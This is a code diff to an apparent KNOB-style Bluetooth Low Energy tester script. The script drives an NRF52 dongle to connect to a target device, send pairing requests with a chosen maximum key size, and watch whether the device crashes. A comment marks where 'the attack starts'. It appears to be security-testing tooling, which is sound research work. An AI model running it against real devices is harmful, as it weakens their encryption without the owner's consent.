@@ -25,9 +25,9 @@ access_address = 0x9a328370
 pairing_iocap = 0x04  # KeyboardDisplay
 # paring_auth_request = 0x00  # No bounding
 # paring_auth_request = 0x01  # Bounding
-paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
+# paring_auth_request = 0x08 | + 0x01  # Le Secure Connection + bounding
 # paring_auth_request = 0x04 | 0x01  # MITM + bounding
-# paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding
+paring_auth_request = 0x08 | 0x40 | 0x01  # Le Secure Connection + MITM + bounding
 
 # Internal vars
 SCAN_TIMEOUT = 2
@@ -59,11 +59,11 @@ if len(sys.argv) >= 3:
 else:
     advertiser_address = 'A4:C1:38:D8:AD:B8'
 
-print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
+print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.lower())
 
 
 def crash_timeout():
-    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
+    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
           ' received\nThe device may have crashed!!!')
     disable_timeout('scan_timeout')
 
@@ -95,6 +95,17 @@ def check_range(array, left, right):
     return len([x for x in array if left <= x <= right]) > 0
 
 
+def send_pairing_request():
+    pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
+        iocap=pairing_iocap,
+        oob=0,
+        authentication=paring_auth_request,
+        max_key_size=current_key_size,
+        initiator_key_distribution=0x07,
+        responder_key_distribution=0x07)
+    driver.send(pairing_req)
+
+
 # Open serial port of NRF52 Dongle
 driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='knob_ble_tester.pcap')
 # Send scan request
@@ -124,8 +135,7 @@ while True:
             update_timeout('scan_timeout')
             # Print slave data channel PDUs summary
             print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
-        elif BTLE_DATA in pkt:
-            update_timeout('scan_timeout')
+
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
         if BTLE_SCAN_RSP in pkt and pkt.AdvA == advertiser_address.lower() and connecting == False:
@@ -155,15 +165,15 @@ while True:
             # them!!!
             driver.send(conn_request)
 
-        elif BTLE_EMPTY_PDU in pkt:
-
-            pass
 
         elif BTLE_DATA in pkt and connecting == True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (Link Layer data channel established)')
             if SM_Security_Request in pkt:
                 set_security_settings(pkt)
+            if LL_VERSION_IND in pkt:
+                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+                driver.send(pkt)
             # Send Feature request
             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
                 feature_set='le_encryption+le_data_len_ext')
@@ -188,14 +198,13 @@ while True:
             driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
-            pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Pairing_Request(
-                iocap=pairing_iocap,
-                oob=0,
-                authentication=paring_auth_request,
-                max_key_size=current_key_size,
-                initiator_key_distribution=0x07,
-                responder_key_distribution=0x07)
-            driver.send(pairing_req)
+            send_pairing_request()
+
+        elif LL_LENGTH_REQ in pkt:
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
+                max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
+            driver.send(pkt)
+            send_pairing_request()
 
         # THE ATTACK STARTS HERE !!!!
         elif SM_Pairing_Response in pkt:
